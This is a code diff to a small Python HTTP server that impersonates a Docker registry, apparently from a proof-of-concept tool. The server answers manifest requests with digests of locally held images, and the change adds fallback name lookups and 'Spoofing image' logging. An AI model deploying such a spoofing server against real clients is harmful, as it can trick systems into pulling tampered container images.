@@ -28,8 +28,20 @@ class MyServer(BaseHTTPRequestHandler):
             image_request = re.match('^/v2/(.+)/manifests/(.+)$', request_path)
             if image_request:
                 name, tag = image_request.groups()
-                image_name = f"{args.rhost}:{args.port}/{name}:{tag}"
-                digest = docker.from_env().images.get(image_name).id
+                print(f"Spoofing image {name}:{tag}")
+                image_names = [f"{name}:{tag}",
+                               f"{args.rhost}/{name}:{tag}",
+                               f"{args.rhost}:{args.port}/{name}:{tag}"]
+                images = docker.from_env().images
+                digest = ''
+                for image_name in image_names:
+                    print(f"Trying image {image_name}")
+                    try:
+                        digest = images.get(image_name).id
+                        print(f"Found image {image_name} with digest: {digest}")
+                        break
+                    except:
+                        pass
                 return_json = bytes(json.dumps({'config': {'digest': digest}}), 'utf-8')
                 self.send_header('Content-Length', f"{len(return_json)}")
                 self.send_header('Content-Type', 'application/vnd.docker.distribution.manifest.v2+json')
